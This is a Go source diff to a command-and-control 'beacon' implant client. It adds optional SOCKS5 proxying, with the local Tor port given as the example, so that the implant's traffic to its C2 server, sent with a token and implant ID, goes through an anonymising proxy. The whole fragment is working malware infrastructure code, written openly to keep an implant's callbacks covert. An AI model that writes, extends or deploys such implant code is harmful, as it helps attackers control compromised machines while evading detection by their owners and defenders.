@@ -2,11 +2,16 @@ package beacon
 
 import (
 	"bytes"
+	"context"
 	"encoding/json"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
+	"net/url"
 	"time"
+
+	"golang.org/x/net/proxy"
 )
 
 // Client communicates with the C2 server.
@@ -17,14 +22,36 @@ type Client struct {
 	http      *http.Client
 }
 
-// NewClient creates a beacon client.
-func NewClient(serverURL, token, implantID string) *Client {
+// NewClient creates a beacon client. If proxyAddr is non-empty (e.g.
+// "socks5://127.0.0.1:9050"), all traffic is routed through that SOCKS5 proxy.
+func NewClient(serverURL, token, implantID, proxyAddr string) *Client {
+	var transport *http.Transport
+
+	if proxyAddr != "" {
+		proxyURL, parseErr := url.Parse(proxyAddr)
+		if parseErr == nil {
+			dialer, err := proxy.FromURL(proxyURL, proxy.Direct)
+			if err == nil {
+				transport = &http.Transport{
+					DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+						return dialer.Dial(network, addr)
+					},
+				}
+			}
+		}
+	}
+
+	if transport == nil {
+		transport = &http.Transport{}
+	}
+
 	return &Client{
 		serverURL: serverURL,
 		token:     token,
 		implantID: implantID,
 		http: &http.Client{
-			Timeout: 30 * time.Second,
+			Timeout:   30 * time.Second,
+			Transport: transport,
 		},
 	}
 }
